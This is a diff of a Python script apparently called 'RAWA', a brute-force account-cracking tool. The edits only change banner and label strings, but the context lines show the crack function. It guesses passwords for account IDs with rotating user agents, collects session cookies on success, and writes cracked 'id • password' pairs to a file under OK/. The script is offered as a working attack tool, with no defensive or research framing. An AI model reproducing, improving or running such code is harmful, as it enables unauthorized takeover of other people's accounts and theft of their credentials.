@@ -99,7 +99,7 @@ def MRDYNO():
 	        
  #------------------[ rawa ]-------------------#
 import os, platform, time, sys
-print('\033[97;1m[\033[92;1mRAWA\033[97;1m] \033[0;96MUPDATE power👌.. ')
+print('\033[97;1m[\033[92;1mRAWA\033[97;1m] \033[0;96MWELCOME TOOL RAWA🔥👌.. ')
 time.sleep(5)
 os.system('clear')
 time.sleep(2)
@@ -594,7 +594,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r \r[RAWA]  \033[1;30m[\033[1;32mOK\033[1;30m/\033[1;33mCP\033[1;30m] - \033[1;30m[\033[1;32m{ok}\033[1;30m/\033[1;33m{cp}\033[1;30m] \033[1;30m[\033[1;36mTEST\033[1;30m/\033[1;32m{loop}\033[1;30m]"),
+    sys.stdout.write(f"\r \r[RAWA]  \033[1;30m[\033[1;32mOK\033[1;30m/\033[1;33mCP\033[1;30m] - \033[1;30m[\033[1;32m{ok}\033[1;30m/\033[1;33m{cp}\033[1;30m] \033[1;30m[\033[1;36mTEST\033[1;30m/\033[1;32m{loop}\033[1;30m] "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -644,7 +644,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[1;30m[\033[1;32mLAWA-OK\033[1;30m]\033[1;32m   {idf} | \033[1;32m{pw}')
+                print(f'\r\033[1;30m[\033[1;32mRAWA-OK\033[1;30m]\033[1;32m   {idf} | \033[1;32m{pw}')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
                 break
